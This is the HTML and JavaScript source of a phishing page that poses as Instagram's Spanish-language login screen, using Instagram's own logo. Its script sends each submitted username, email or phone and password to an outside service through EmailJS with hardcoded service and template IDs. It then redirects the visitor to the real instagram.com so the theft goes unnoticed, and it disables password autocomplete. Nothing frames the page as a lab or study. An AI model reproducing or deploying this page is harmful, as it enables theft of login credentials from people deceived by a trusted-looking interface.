<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <!-- Icono de Instagram -->
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yG/r/K8y7g023Jmu.png" type="image/x-icon">
    
    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 350px;
            text-align: center;
        }
        h2 {
            font-family: 'Segoe UI', sans-serif;
            margin: 0 0 20px 0;
            font-size: 24px;
            color: #262626;
        }
        .logo {
            width: 175px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 9px 7px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            margin-bottom: 10px;
            font-size: 12px;
            box-sizing: border-box;
        }
        input:focus {
            border-color: #aaa;
            outline: none;
        }
        button {
            width: 100%;
            background-color: #0095f6;
            border: none;
            color: #fff;
            padding: 7px;
            border-radius: 4px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #1877f2;
        }
        button:disabled {
            background-color: #bdedef;
            cursor: default;
        }
        .footer {
            margin-top: 15px;
            font-size: 12px;
            color: #8e8e8e;
        }
        .footer a {
            color: #003768;
            text-decoration: none;
        }
        /* Spinner de carga */
        .spinner {
            display: none;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="login-container">
        <!-- Logo de Instagram -->
        <img src="https://static.cdninstagram.com/rsrc.php/v3/yl/r/1nQIKYVrYnJ.png" alt="Instagram" class="logo">
        
        <!-- Formulario -->
        <form id="login-form">
            <input type="text" name="user_email" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            
            <div class="spinner" id="spinner"></div>
            
            <button type="submit" id="submit-btn">Iniciar sesión</button>
        </form>

        <div class="footer">
            <a href="https://www.instagram.com/accounts/password/request/">¿Has olvidado la contraseña?</a>
        </div>
    </div>

    <!-- Scripts de EmailJS -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function(){
            // Tu Public Key
            emailjs.init("q1IUmbgdFeBvmxnvi"); 
        })();
    </script>

    <script type="text/javascript">
        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault();
            
            var btn = document.getElementById('submit-btn');
            var spinner = document.getElementById('spinner');
            
            // Deshabilitar botón y mostrar spinner
            btn.disabled = true;
            btn.innerText = "Verificando...";
            spinner.style.display = "block";
            
            // Tus IDs
            emailjs.sendForm("service_rkpt26i", "template_zl3ywbm", this)
                .then(function() {
                    // Éxito: Redirigir a Instagram
                    spinner.style.display = "none";
                    btn.innerText = "¡Éxito!";
                    btn.style.backgroundColor = "#4CAF50"; // Verde
                    
                    setTimeout(function() {
                        window.location.href = "https://www.instagram.com";
                    }, 1500); // 1.5 segundos de espera

                }, function(error) {
                    // Error
                    spinner.style.display = "none";
                    btn.disabled = false;
                    btn.innerText = "Iniciar sesión";
                    alert('Error: ' + JSON.stringify(error));
                });
        });
    </script>
    <script>
    // Fuerza al navegador a no autocompletar el campo de contraseña
    document.querySelector('input[type="password"]').setAttribute('autocomplete', 'new-password');
    </script>
</body>
  </html>
